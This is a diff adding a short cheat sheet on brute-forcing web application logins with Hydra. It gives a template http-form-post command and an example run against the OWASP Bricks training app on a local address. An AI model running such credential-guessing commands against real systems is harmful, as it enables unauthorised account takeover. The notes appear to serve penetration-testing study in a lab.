@@ -1,0 +1,9 @@
+################################################ BRUTE FORCING in WEBAPPS #########################################
+
+####### HYDRA ########
+
+1) Brute forcing POST logins
+	hydra <host-name> http-form-post "<url from burp>:<username tag name>=^USER^&<passwor tag name>=^PASS^&<submit tag name>=<submit tag name>:<text of failure>" -L <user-name list> -P <passords-list>
+
+	eg - Brute forcing OSWAP Bricks login 3
+	hydra 192.168.1.2 http-form-post "/owaspbricks/login-3/index.php:username=^USER^&passwd=^PASS^&submit=submit:wrong user name or password." -L users.txt -P pass.txt
